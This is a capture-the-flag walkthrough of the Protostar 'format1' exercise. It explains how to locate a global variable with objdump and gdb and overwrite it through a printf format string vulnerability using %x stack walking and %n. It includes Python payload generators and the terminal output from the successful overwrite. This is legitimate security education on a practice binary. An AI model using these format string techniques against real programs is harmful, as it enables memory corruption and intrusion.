# Format1 protostar


> This level shows how format strings can be used to modify arbitrary memory locations.
>  
> Hints
>  
> objdump -t is your friend, and your input string lies far up the stack :)
> This level is at /opt/protostar/bin/format1


As you can see, `objdump -t` shows us that `target` is 4 bytes large in the `.bss` section. It is in address `0x8049638`. Unitialised global and static variables are stored in the `.bss` section.

```
user@protostar:/opt/protostar/bin$ objdump -t format1

format1:     file format elf32-i386

SYMBOL TABLE:
[...]
08049638 g     O .bss	00000004              target
[...]
```

When we take a look in `gdb`, we can see that the variable `target` really is in address `0x8049638`.

```
(gdb) disassemble vuln
Dump of assembler code for function vuln:
[...]
0x08048405 <vuln+17>:	mov    eax,ds:0x8049638
0x0804840a <vuln+22>:	test   eax,eax
(gdb) x/x 0x8049638
0x8049638 <target>:	0x00000000
```

Our goal is to override its value using a format string attack. The perfect candidate to do that is `"%n"`.

> The number of characters written so far is stored into the integer pointed to by the corresponding argument. That argument shall be an int *, or variant whose size matches the (optionally) supplied integer length modifier. No argument is converted. (This specifier is not supported by the bionic C library.) The behavior is undefined if the conversion specification includes any flags, a field width, or a precision.
>  
> [Printf man pages](https://www.mankier.com/3/printf#Description-Field_width)


### First (failed) attempt

We know that ASLR is not enabled because this is a challenge for beginners. That means the address of the stack should remain unchanged as does the address for `target`. (We will learn later that that is not necessarily the case even without ASLR.) To write to `target` using the format string specifier `"%n"`, we have to find the memory address `0x8049638` in the stack. This is because the argument to `"%n"` is a *pointer* to an integer. However, I could not find the memory address anywhere in the stack. 
```
(gdb) x/200wx $esp
0xbffff670:	0xbffff8ab	0x0804960c	0xbffff6a8	0x08048469
0xbffff680:	0xb7fd8304	0xb7fd7ff4	0xbffff6a8	0x08048435
0xbffff690:	0xbffff8ab	0xb7ff1040	0x0804845b	0xb7fd7ff4
0xbffff6a0:	0x08048450	0x00000000	0xbffff728	0xb7eadc76
0xbffff6b0:	0x00000002	0xbffff754	0xbffff760	0xb7fe1848
[...]
```
We have to place it in the stack ourselves. We can do so using user input. As user input is passed to the `<main>` function as an argument, it will be present in the stack. The only question is, which part? Let's take a look. According to gdb, just before `<printf>` is called, `esp` has a value of `0xbffff670`. The string the user inputs is located in address `0xbffff8ab`.
```
[...]
(gdb) p/x $esp
$1 = 0xbffff670
(gdb) x/s 0xbffff8ab
0xbffff8ab:	 "%x%x"
(gdb) 
```
That means that the string is the 142.75th DWORD argument. You might think, "Woah, why is there a decimal?". It just means that the address of the string is not DWORD aligned. That will present a problem if the address of `target` is placed at the beginning of the string.
```
0xbffff8ab - 0xbffff670 = 0x23B
0x23B / 0x4 = 142.75
```
So, our input looks like this `"A <addr of target>_%x_%x..._%x_%n"`, where `"%x"` occurs 142 times. That way, `"%n"` references the 143rd argument, which will be the address of `target` in address `0xbffff8ac`. I even prepared us a Python script.
```
import struct

exploit = "A"
exploit += struct.pack("I", 0x08049638)

num_Dwords = 142

for i in range(num_Dwords):
        exploit += "_%x"

exploit += "%n"

print exploit
```

Unfortunately it did not work as intended. We got a segmentation fault. `"%n"` tried to access memory it should not.
```
user@protostar:/opt/protostar/bin$ cat /home/user/format1 | xargs ./format1
xargs: ./format1: terminated by signal 11
```
I edited the Python script to figure out what memory address was being written to. This time, I print `"%x"` 143 times (instead of 142) so the last argument that is printed is the address that `<printf>` tried to write to.
```
import struct

exploit = "A"
exploit += struct.pack("I", 0x08049638)

num_Dwords = 143

for i in range(num_Dwords):
        exploit += "_%x"

#exploit += "%n"

print exploit
```

Said address is `0x255f7825`. That is the hex representation of `"%_x%"`, a substring of our input.
```
user@protostar:/opt/protostar/bin$ cat /home/user/format1 | xargs ./format1A8�_[...]_4963841_78255f08_5f78255f_255f7825_78255f78_5f78255f_255f7825
```
In fact, `"4963841_78255f08_5f78255f_255f7825_78255f78_5f78255f_255f7825"` is the beginning part of our input. Apparently our calculation was incorrect. Not only have we overshot the address of `target`, the character `"A"` which was supposed to make said address DWORD aligned actually made things worse. The address is split into 2 separate bytes. It is no wonder our exploit failed.



Weirdly however, when I print `"%x"` 138 times though, it shows the address of `target` perfectly aligned.
```
user@protostar:/opt/protostar/bin$ cat /home/user/format1 | xargs ./format1
[...]41003174_8049638_41414141_5f78255f
```

I wondered by the arrangment of `target`'s address would change every time i changed the number of `"%x"`. Even though `<printf>` accesses its arguments from lower memory address to higher address, the stack moves from higher memory address to lower memory address. That means when the length of our argument to `<main>` changes, so does `esp` and the address of the string.

```
(gdb) p/x $esp
$2 = 0xbffff660
(gdb) x/s 0xbffff8a7
0xbffff8a7:	 "%x%x%x%x"
```
```
(gdb) p/x $esp
$1 = 0xbffff670
(gdb) x/s 0xbffff8ab
0xbffff8ab:	 "%x%x"
```
I think the address of the string with `"%x%x%x%x"` is 4 bytes smaller than that of the string `"%x%x"` because of the extra 4 characters. So in a way the larger string ends further up the stack and thus has a smaller address. 


|0xbffff8a7|0xbffff8a9|0xbffff8ab| 0xbffff8ad|
|---|---|---|---|
||| %x | %x |
| %x | %x | %x | %x |

Once we change the number of characters in the string, for whatever reason, the address of the string changes, so does `esp` when `<printf>` is called. Our own input length doomed us. To avoid this problem, let's use padding. That way, the length of our string is constant. 

With that out of the way, we just have to find the correct number of `"%x"`s and the number of padding characters to include. To do so, we have to play with their values and see which one works.

### Improvement to script

I edited my Python script to keep the total number of characters in the string input constant. The total number of characters is arbitrary. The characters `"AAAA"` are just there to make it easy to spot `target`'s address even if it is jumbled up.

First, I picked the number 500, but the memory address of `target` was jumbled up. So I knew it was wrong. 
```
import struct
is_time_to_exploit = False
exploit = struct.pack("I", 0x8049638)
exploit += struct.pack("I", 0x8049638)
exploit += "\x41\x41\x41\x41"
total_length = 500
num_Dwords = 147
for i in range(num_Dwords):
        exploit += "_%x"
        
if is_time_to_exploit:
        exploit += "_%n"
        num_Dwords += 1

remaining_len = total_length - (num_Dwords * 3)
assert remaining_len >= 0
for i in range(remaining_len):
        exploit += "_"
        
print exploit
```
```
user@protostar:/opt/protostar/bin$ cat /home/user/format1 | xargs ./format1
[...]_96380031_96380804_41410804[...]
```

I tried several other values, and eventually arrived at the number 478 for the total number of characters. It printed the memory addresses as expected.
```
[...]
total_length = 478
num_Dwords = 136
[...]
```
```
cat /home/user/format1 | xargs ./format1
[...]_8049638_8049638______________________________________________________________________

```


### Winning input

We now have the correct number of characters in the string, as well as the correct number of `"%x"` to reach the memory address of `target`. Instead of printing the 2nd `"8049638"` with `"%x"`, let's write to its memory location with `"%n"` instead. After a simple edit to the Python script, we successfully overwrote the value of `target`.
```
import struct

is_time_to_exploit = True

exploit = struct.pack("I", 0x8049638)
exploit += struct.pack("I", 0x8049638)
exploit += "\x41\x41\x41\x41"

total_length = 478
num_Dwords = 135

for i in range(num_Dwords):
        exploit += "_%x"

if is_time_to_exploit:
        exploit += "_%n"
        num_Dwords += 1

remaining_len = total_length - (num_Dwords * 3)

assert remaining_len >= 0

for i in range(remaining_len):
        exploit += "_"

print exploit

```
```
user@protostar:/opt/protostar/bin$ cat /home/user/format1 | xargs ./format1
8�8�AAAA_804960c_bffff508_8048469_b7fd8304_b7fd7ff4_bffff508_8048435_bffff6ec_b7ff1040_804845b_b7fd7ff4_8048450_0_bffff588_b7eadc76_2_bffff5b4_bffff5c0_b7fe1848_bffff570_ffffffff_b7ffeff4_804824d_1_bffff570_b7ff0626_b7fffab0_b7fe1b28_b7fd7ff4_0_0_bffff588_10712307_3a237517_0_0_0_2_8048340_0_b7ff6210_b7eadb9b_b7ffeff4_2_8048340_0_8048361_804841c_2_bffff5b4_8048450_8048440_b7ff1040_bffff5ac_b7fff8f8_2_bffff6e2_bffff6ec_0_bffff8d7_bffff8ec_bffff903_bffff91b_bffff929_bffff93d_bffff95f_bffff976_bffff989_bffff993_bffffe83_bffffe9c_bffffeda_bffffeee_bfffff0c_bfffff23_bfffff34_bfffff4f_bfffff57_bfffff67_bfffff74_bfffffa7_bfffffbb_bfffffcf_bfffffe1_0_20_b7fe2414_21_b7fe2000_10_78bf3bf_6_1000_11_64_3_8048034_4_20_5_7_7_b7fe3000_8_0_9_8048340_b_3e9_c_0_d_3e9_e_3e9_17_1_19_bffff6cb_1f_bffffff2_f_bffff6db_0_0_d9000000_81e0d88d_553c77cd_85e7caab_69b3867c_363836_2f2e0000_6d726f66_317461_8049638_______________________________________________________________________you have modified the target :)
```